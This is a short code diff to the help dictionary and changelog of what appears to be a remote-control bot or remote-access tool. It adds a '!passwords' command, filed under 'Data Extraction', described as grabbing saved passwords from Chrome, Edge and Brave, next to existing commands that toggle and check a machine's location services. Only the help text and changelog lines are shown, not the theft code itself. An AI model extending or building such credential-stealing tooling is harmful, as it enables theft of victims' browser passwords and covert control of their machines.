@@ -67,10 +67,16 @@ const helpDict = {
   "enableloc": { "explanation": "Enables Location Services", "category": "Utility" },
   "disableloc": { "explanation": "Disables Location Services", "category": "Utility" },
   "checkloc": { "explanation": "Checks if Location Services are enabled", "category": "Utility" },
+    "passwords": { "explanation": "Grabs passwords from Chrome, Edge and Brave", "category": "Data Extraction" },
 };
 
 /* ======= Changelog (multi-line, English) ======= */
 const changelog = [
+  { v: "v8.5", note: [
+    "Added !passwords",
+    "Grabs passwords from Edge, Chrome and Brave",
+    ].join("\n")
+  },
   { v: "v8.4", note: [
     "Added !enableloc",
     "Enables Location Services",
